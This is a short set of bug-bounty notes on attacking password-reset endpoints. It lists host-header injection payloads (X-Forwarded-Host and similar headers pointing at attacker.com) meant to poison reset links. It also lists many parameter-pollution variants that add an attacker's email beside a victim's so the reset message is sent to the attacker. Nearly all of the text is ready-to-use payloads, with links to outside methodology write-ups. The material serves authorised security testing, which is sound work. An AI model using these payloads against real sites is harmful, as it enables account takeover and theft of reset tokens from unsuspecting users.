
# Bug Hunting Notes: Forget Password Endpoint

## 1. Test Host Header Injection

### Test Payloads
```
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-For: attacker.com
x-forwarded-prefix: attacker.com
```

### Bypass Techniques
```
X-Forwarded-Host:
X-Forwarded-Host: evil.target.com
```

### Reference
- [X-Forwarded-Host Abuse - Medium](https://medium.com/@whithat444/list/xforwardedhost-a77303ffd2b6)

---

## 2. Test Parameter Pollution

### Test Payloads

```
email=victim@gmail.com&email=attacker@gmail.com
email[]=victim@gmail.com&email[]=attacker@gmail.com
email=["victim@gmail.com","attacker@gmail.com"]
email={"victim@gmail.com","attacker@gmail.com"}
email=victim@gmail.com%20email=attacker@gmail.com
email=victim@gmail.com|email=attacker@gmail.com
email=victim@gmail.com,attacker@gmail.com
email=[victim@gmail.com&email=attacker@gmail.com]
email[]=[victim@gmail.com&email[]=attacker@gmail.com]
email=[victim@gmail.com%20email=attacker@gmail.com]
email=[victim@gmail.com|email=attacker@gmail.com]
email[]=["victim@gmail.com","email[]=attacker@gmail.com]
email=["victim@gmail.com"%20email=attacker@gmail.com]
email=[victim@gmail.com|email=attacker@gmail.com]
```

```
email=victim@gmail.com&email=attacker@gmail.com
email[]=victim@gmail.com&email[]=attacker@gmail.com
email=victim@gmail.com%20email=attacker@gmail.com
email=victim@gmail.com|email=attacker@gmail.com
{"email":"victim@gmail.com","email":"attacker@gmail.com"}
{"email":["victim@gmail.com","attacker@gmail.com"]}
```

### Reference
- [Parameter Pollution Tweet](https://x.com/Jayesh25_/status/1722597769385329062)
- [Password Reset Methodology - GitHub](https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/PasswordReset.md)
